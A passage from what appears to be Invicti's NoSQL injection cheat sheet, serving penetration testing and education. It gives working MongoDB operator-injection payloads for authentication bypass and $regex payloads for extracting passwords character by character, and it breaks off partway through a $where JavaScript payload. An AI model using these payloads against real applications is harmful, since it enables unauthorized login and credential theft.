><div class=3D"container-large"><div class=3D"padding-section-small"><div c=
lass=3D"component whitepaper-details"><div class=3D"template-details_text-c=
ontain"><div class=3D"template-details_rich-text-contain"><div fs-toc-offse=
ttop=3D"8rem" fs-toc-element=3D"contents" class=3D"doc-rich-text w-richtext=
"><p>This cheat sheet is a living document in constant development, and as =
with any cheat sheet, some examples may not work in every situation, since =
injection in real environments varies by database version, driver behavior,=
 and application framework.</p><p>See also our <a href=3D"https://www.invic=
ti.com/blog/web-security/sql-injection-cheat-sheet/" data-wf-native-id-path=
=3D"1d391001-c602-9db1-8832-1c780ed4b070" data-wf-ao-click-engagement-track=
ing=3D"true" data-wf-element-id=3D"1d391001-c602-9db1-8832-1c780ed4b070">SQ=
L injection cheat sheet</a> =E2=80=93 a similar reference for SQLi, coverin=
g MySQL, SQL Server, Oracle, PostgreSQL, and SQLite.</p><div id=3D"how-invi=
cti-detects-nosql-injection" style=3D"scroll-margin-top: 8rem;"><h2>How Inv=
icti detects NoSQL injection</h2><p>Invicti=E2=80=99s DAST runs four distin=
ct detection engines against MongoDB injection, each targeting a different =
technique: error-based (identifying MongoDB-specific error signatures), boo=
lean-based (comparing true and false conditions), time-based blind (measuri=
ng response delays), and operator injection (testing parameters for $ne, $g=
t, $regex, and related operators). All four run automatically against form =
parameters, JSON request bodies, GraphQL parameters, and other modern API s=
urfaces, not just legacy web forms.</p><p>Where a vulnerability is confirme=
d, Invicti=E2=80=99s proof-based scanning generates a proof of exploit rath=
er than a =E2=80=9Cpossible vulnerability=E2=80=9D flag, so security teams =
can prioritize the finding with confidence instead of triaging it as a pote=
ntial false positive.</p><p><a href=3D"https://www.invicti.com/clp/proof-ba=
sed-scanning-whitepaper/" data-wf-native-id-path=3D"1d391001-c602-9db1-8832=
-1c780ed4b07a" data-wf-ao-click-engagement-tracking=3D"true" data-wf-elemen=
t-id=3D"1d391001-c602-9db1-8832-1c780ed4b07a">Learn how proof-based scannin=
g works</a> and<a href=3D"https://www.invicti.com/get-demo/" data-wf-native=
-id-path=3D"1d391001-c602-9db1-8832-1c780ed4b07d" data-wf-ao-click-engageme=
nt-tracking=3D"true" data-wf-element-id=3D"1d391001-c602-9db1-8832-1c780ed4=
b07d"> request a demo</a> to see it in action.</p></div><div id=3D"what-is-=
nosql-injection" style=3D"scroll-margin-top: 8rem;"><h2><strong>What is NoS=
QL injection?</strong></h2><p>NoSQL injection is a class of injection attac=
k targeting databases that use non-relational data stores: document databas=
es like MongoDB, key-value stores like Redis, wide-column stores like Cassa=
ndra, and others. Unlike <a href=3D"https://www.invicti.com/learn/sql-injec=
tion-sqli/" data-wf-native-id-path=3D"1d391001-c602-9db1-8832-1c780ed4b085"=
 data-wf-ao-click-engagement-tracking=3D"true" data-wf-element-id=3D"1d3910=
01-c602-9db1-8832-1c780ed4b085">SQL injection</a>, which manipulates a stan=
dardized declarative query language (SQL), NoSQL injection exploits the spe=
cific query API, operators, and data formats of each database type.</p><p>T=
he most commonly exploited NoSQL injection class is MongoDB operator inject=
ion: inserting MongoDB query operators such as $ne, $gt, $where, and $regex=
 into application inputs that are forwarded to the database without type va=
lidation.</p></div><div id=3D"how-nosql-injection-differs-from-sql-injectio=
n" style=3D"scroll-margin-top: 8rem;"><h2><strong>How NoSQL injection diffe=
rs from SQL injection</strong></h2><div class=3D"w-embed"><table style=3D"t=
able-layout: auto;">
  <thead>
    <tr>
      <th></th>
      <th>SQL injection</th>
      <th>NoSQL injection</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Query language</td>
      <td>Standardized SQL with product-specific dialects</td>
      <td>Entirely database-specific (MongoDB query language, Redis command=
s, CQL queries for Cassandra)</td>
    </tr>
    <tr>
      <td>Injection syntax</td>
      <td>SQL keywords, operators, comments</td>
      <td>JSON operators, JavaScript, CRLF, key-value commands (depending o=
n the product)</td>
    </tr>
    <tr>
      <td>Most basic techniques</td>
      <td>String termination (<code>'</code>, <code>--</code>)</td>
      <td>Operator injection (<code>{"$ne": null}</code>), array injection<=
/td>
    </tr>
    <tr>
      <td>Vanilla authentication bypass</td>
      <td><code>' OR 1=3D1--</code></td>
      <td><code>{"$ne": null}</code> or <code>{"$gt": ""}</code></td>
    </tr>
    <tr>
      <td>Blind techniques</td>
      <td>Boolean conditions, <code>SLEEP()</code></td>
      <td>Boolean operators, JavaScript timing loops (where scripting is en=
abled)</td>
    </tr>
    <tr>
      <td>Code execution potential</td>
      <td>Via <code>xp_cmdshell</code>, user-defined functions</td>
      <td>Historically via JavaScript execution in <code>$where</code> (now=
 largely closed off by vendors); the most severe recent cases (the Mongoose=
 CVEs covered below) ran through an ODM library=E2=80=99s own JavaScript ev=
aluation, not the database engine itself</td>
    </tr>
    <tr>
      <td>Variations between databases</td>
      <td>A handful of major SQL dialects</td>
      <td>Each database has its own query language or API</td>
    </tr>
  </tbody>
</table></div></div><div id=3D"tests-to-check-if-nosql-injection-is-possibl=
e" style=3D"scroll-margin-top: 8rem;"><h2><strong>Tests to check if NoSQL i=
njection is possible</strong></h2><div id=3D"syntax-breaking-tests" style=
=3D"scroll-margin-top: 8rem;"><h3><strong>Syntax-breaking tests</strong></h=
3><p>Send these to any input that might reach a NoSQL query, and watch for =
error messages, changed behavior, or unexpected results:</p><pre contentedi=
table=3D"false" class=3D"w-code-block" style=3D"display:block;overflow-x:au=
to;background:#2b2b2b;color:#f8f8f2;padding:0.5em"><code class=3D"language-=
plaintext" style=3D"white-space:pre-wrap"><span><span>'
</span></span><span>"
</span><span>\
</span><span>{
</span><span>}
</span><span>[
</span><span>]
</span><span>;
</span><span>$</span></code></pre></div><div id=3D"operator-injection-detec=
tion" style=3D"scroll-margin-top: 8rem;"><h3><strong>Operator injection det=
ection</strong></h3><p>For URL-encoded form parameters:</p><pre contentedit=
able=3D"false" class=3D"w-code-block" style=3D"display:block;overflow-x:aut=
o;background:#2b2b2b;color:#f8f8f2;padding:0.5em"><code class=3D"language-p=
laintext" style=3D"white-space:pre-wrap"><span><span>param[$ne]=3Dxyz
</span></span><span>param[$gt]=3D
</span><span>param[$regex]=3D.*</span></code></pre><p>For JSON request bodi=
es:</p><pre contenteditable=3D"false" class=3D"w-code-block" style=3D"displ=
ay:block;overflow-x:auto;background:#2b2b2b;color:#f8f8f2;padding:0.5em"><c=
ode class=3D"language-plaintext" style=3D"white-space:pre-wrap"><span><span=
>{"param": {"$ne": null}}
</span></span><span>{"param": {"$gt": ""}}
</span><span>{"param": {"$regex": ".*"}}</span></code></pre><p>If any of th=
ese change the application=E2=80=99s behavior compared to a normal string v=
alue, the input is very likely being forwarded into a query without type ch=
ecking.</p></div><div id=3D"boolean-condition-tests" style=3D"scroll-margin=
-top: 8rem;"><h3><strong>Boolean condition tests</strong></h3><p>Compare th=
e response for a condition that should be true against one that should be f=
alse. If the responses differ in content, size, or status code, boolean-bas=
ed NoSQL injection is confirmed. The exact syntax depends on the database a=
nd injection point; the MongoDB-specific patterns are covered in the next s=
ection.</p></div></div><div id=3D"mongodb-injection" style=3D"scroll-margin=
-top: 8rem;"><h2><strong>MongoDB injection</strong></h2><p>MongoDB is the m=
ost widely deployed NoSQL database and by far the dominant target for NoSQL=
 injection. Its query language accepts operators as JSON keys, which is wha=
t makes operator injection possible: if an application takes a value straig=
ht from user input and drops it into a query object without checking that i=
t=E2=80=99s a plain string or number, an attacker can supply an object inst=
ead and change what the query does.</p><div id=3D"operator-injection-authen=
tication-bypass" style=3D"scroll-margin-top: 8rem;"><h3><strong>Operator in=
jection: Authentication bypass</strong></h3><div id=3D"using-dollarne-not-e=
qual"><h4>Using $ne (not equal)</h4><p>URL-encoded form parameters:</p><pre=
 contenteditable=3D"false" class=3D"w-code-block" style=3D"display:block;ov=
erflow-x:auto;background:#2b2b2b;color:#f8f8f2;padding:0.5em"><code class=
=3D"language-plaintext" style=3D"white-space:pre-wrap"><span><span>username=
[$ne]=3Dtoto&amp;password[$ne]=3Dtoto</span></span></code></pre><p>JSON req=
uest body:</p><pre contenteditable=3D"false" class=3D"w-code-block" style=
=3D"display:block;overflow-x:auto;background:#2b2b2b;color:#f8f8f2;padding:=
0.5em"><code class=3D"language-json" style=3D"white-space:pre-wrap"><span><=
span>{</span><span class=3D"hljs-attr">"username"</span><span>: {</span><sp=
an class=3D"hljs-attr">"$ne"</span><span>: </span><span style=3D"color:#f5a=
b35">null</span><span>}, </span><span class=3D"hljs-attr">"password"</span>=
<span>: {</span><span class=3D"hljs-attr">"$ne"</span><span>: </span><span =
style=3D"color:#f5ab35">null</span><span>}}</span></span></code></pre><p>If=
 the application runs something like <code>db.users.findOne({ username: use=
rname, password: password })</code> and forwards these values directly, <co=
de>$ne: null</code> matches the first document where the field isn=E2=80=99=
t null, which is any real user record. This is the NoSQL equivalent of SQL=
=E2=80=99s <code>' OR 1=3D1--</code>.</p></div><div id=3D"using-dollargt-gr=
eater-than"><h4>Using $gt (greater than)</h4><pre contenteditable=3D"false"=
 class=3D"w-code-block" style=3D"display:block;overflow-x:auto;background:#=
2b2b2b;color:#f8f8f2;padding:0.5em"><code class=3D"language-plaintext" styl=
e=3D"white-space:pre-wrap"><span><span>{"username": {"$gt": ""}, "password"=
: {"$gt": ""}}</span></span></code></pre><p>An empty-string <code>$gt</code=
> comparison matches any non-empty string, which achieves the same bypass t=
hrough a different operator.</p></div><div id=3D"using-dollarin-array-membe=
rship"><h4>Using $in (array membership)</h4><pre contenteditable=3D"false" =
class=3D"w-code-block" style=3D"display:block;overflow-x:auto;background:#2=
b2b2b;color:#f8f8f2;padding:0.5em"><code class=3D"language-plaintext" style=
=3D"white-space:pre-wrap"><span><span>{"username": {"$in": ["admin", "admin=
istrator", "root"]}, "password": {"$ne": null}}</span></span></code></pre><=
p>This tries a short list of likely privileged usernames in a single reques=
t.</p></div><div id=3D"using-dollarexists-and-dollarnin-for-reconnaissance"=
><h4>Using $exists and $nin for reconnaissance</h4><pre contenteditable=3D"=
false" class=3D"w-code-block" style=3D"display:block;overflow-x:auto;backgr=
ound:#2b2b2b;color:#f8f8f2;padding:0.5em"><code class=3D"language-plaintext=
" style=3D"white-space:pre-wrap"><span><span>{"admin_flag": {"$exists": tru=
e}}
</span></span><span>{"username": {"$nin": ["admin", "guest"]}, "password": =
{"$ne": null}}</span></code></pre><p><code>$exists</code> confirms whether =
a field is present on the document at all, useful for probing schema before=
 committing to an authentication-bypass payload. <code>$nin</code> excludes=
 known values and returns the next match, which is handy for discovering ad=
ditional account names once one is already known.</p></div></div><div id=3D=
"operator-injection-data-extraction-with-dollarregex" style=3D"scroll-margi=
n-top: 8rem;"><h3><strong>Operator injection: Data extraction with $regex</=
strong></h3><p>The <code>$regex</code> operator lets you extract data chara=
cter by character when the application reflects whether a query matched any=
thing, the same principle as boolean-based blind SQL injection.</p><div id=
=3D"testing-whether-a-field-starts-with-a-given-character"><h4>Testing whet=
her a field starts with a given character</h4><pre contenteditable=3D"false=
" class=3D"w-code-block" style=3D"display:block;overflow-x:auto;background:=
#2b2b2b;color:#f8f8f2;padding:0.5em"><code class=3D"language-plaintext" sty=
le=3D"white-space:pre-wrap"><span><span>{"username": {"$regex": "^a"}}
</span></span><span>{"username": {"$regex": "^b"}}</span></code></pre></div=
><div id=3D"testing-field-length"><h4>Testing field length</h4><pre content=
editable=3D"false" class=3D"w-code-block" style=3D"display:block;overflow-x=
:auto;background:#2b2b2b;color:#f8f8f2;padding:0.5em"><code class=3D"langua=
ge-plaintext" style=3D"white-space:pre-wrap"><span><span>{"password": {"$re=
gex": "^.{8}$"}}</span></span></code></pre></div><div id=3D"extracting-a-fi=
eld-character-by-character"><h4>Extracting a field character by character</=
h4><pre contenteditable=3D"false" class=3D"w-code-block" style=3D"display:b=
lock;overflow-x:auto;background:#2b2b2b;color:#f8f8f2;padding:0.5em"><code =
class=3D"language-plaintext" style=3D"white-space:pre-wrap"><span><span>{"u=
sername": "admin", "password": {"$regex": "^a"}}
</span></span><span>{"username": "admin", "password": {"$regex": "^b"}}</sp=
an></code></pre><p>Repeat across the alphabet and numerals for each positio=
n to reconstruct the full value. This is slow by hand but straightforward t=
o automate.</p></div></div><div id=3D"javascript-injection-with-dollarwhere=
" style=3D"scroll-margin-top: 8rem;"><h3>JavaScript injection with $where</=
h3><p>The <code>$where</code> operator evaluates a JavaScript expression ag=
ainst every document in a collection. If user input reaches a <code>$where<=
/code> clause unsanitized, arbitrary JavaScript execution against the query=
 engine becomes possible.</p><p>This is also the operator=E2=80=99s biggest=
 liability, and MongoDB has been moving away from it for years. Server-side=
 JavaScript, including <code>$where</code>, <code>$function</code>, and <co=
de>$accumulator</code>, has been formally deprecated since MongoDB 8.0, and=
 the <code>security.javascriptEnabled</code> setting (still <code>true</cod=
e> by default as of mid-2026) can disable it entirely on a given deployment=
.&nbsp;</p><p>Treat every <code>$where</code> payload below as something to=
 test for, not something to assume will work: on a growing share of product=
ion deployments, either the operator is disabled outright or the applicatio=
n has already migrated to <code>$expr</code>, which does not execute JavaSc=
ript and is not vulnerable to this class of injection at all.</p><div id=3D=
"basic-authentication-bypass"><h4>Basic authentication bypass</h4><pre cont=
enteditable=3D"false" class=3D"w-code-block" style=3D"display:block;overflo=
w-x:auto;background:#2b2b2b;color:#f8f8f2;padding:0.5em"><code class=3D"lan=
guage-plaintext" style=3D"white-space:pre-wrap"><span><span>{"$where": "1=
